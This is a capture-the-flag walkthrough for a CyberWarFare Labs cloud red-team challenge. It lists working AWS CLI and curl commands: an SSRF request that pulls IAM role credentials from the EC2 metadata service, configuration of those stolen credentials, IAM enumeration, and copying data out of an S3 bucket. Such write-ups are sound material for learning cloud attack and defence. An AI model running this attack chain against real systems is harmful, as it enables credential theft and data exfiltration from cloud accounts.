# 🛡️ MCRTA AWS Challenge – Red Teaming Walkthrough

This document summarizes the complete steps and commands used to solve the **MCRTA AWS Cloud Challenge** related to EC2, S3, IAM, and enumeration tasks. It includes **detailed AWS CLI usage**, SSRF exploitation, and privilege analysis.

### 🧰 AWS CLI Commands and Purpose

#### 🔓 1. Exploit SSRF to Obtain Credentials

```bash
curl -s -X POST http://3.131.157.209/process.php \
  -F "ip=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" \
  -F "organization=echo" \
  -F "url=test" \
  -F "date=2001-11-11"
```

**Goal:** Leverage SSRF via `ip` parameter to fetch IAM role credentials from EC2 metadata.

***

#### 🔐 2. Configure AWS CLI with Stolen Temporary Credentials

```bash
aws configure --profile temp
# Then set:
# AWS Access Key ID     -> from SSRF output
# AWS Secret Access Key -> from SSRF output
# Default region        -> us-east-2
# Default output format -> json

aws configure set aws_session_token "SESSION_TOKEN" --profile temp
```

***

#### 👤 3. Validate Credentials

```bash
aws sts get-caller-identity --profile temp
```

**Output:** Shows account ID, UserId, and assumed role ARN.

***

#### 🔍 4. Enumerate IAM Users

```bash
aws iam list-users --profile temp
```

***

#### 👥 5. Enumerate IAM Groups

```bash
aws iam list-groups --profile temp
```

```bash
aws iam get-group --group-name interns --profile temp
```

***

#### 🧑‍💼 6. Check Groups for Specific Users

```bash
aws iam list-groups-for-user --user-name emp003 --profile temp
```

***

#### 🔐 7. Find Trusted Relationships in Roles

```bash
aws iam list-roles --profile temp
```

```bash
aws iam get-role --role-name crossaccount-role --profile temp
```

**Check:**\
Look for `"Principal": {"AWS": "arn:aws:iam::999909936336:root"}`

***

#### 🔁 8. Check Which Role Can Be Assumed by Another

```bash
aws iam get-role --role-name dev-role --profile temp
```

Check if `Principal.AWS` is the `devops-role`.

***

#### 📄 9. Find Inline Policies Attached to Users

```bash
aws iam list-user-policies --user-name emp001 --profile temp
```

***

#### 📜 10. Get Policies Attached to Group

```bash
aws iam list-attached-group-policies --group-name employees --profile temp
```

```bash
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/AmazonDevOpsGuruFullAccess --profile temp
```

***

#### 📦 11. List and Exfiltrate Data from S3

```bash
aws s3 ls --profile temp
aws s3 ls s3://cwl-metatech-prod --profile temp
aws s3 cp s3://cwl-metatech-prod/prod-data.txt ./ --profile temp
cat prod-data.txt
```

***

**Author**: _n0rmh3ll – MCRTA Walkthrough_\
**Platform**: CyberWarFare Labs\
**Challenge**: MCRTA (MetaTech Cloud Red Team Assessment)
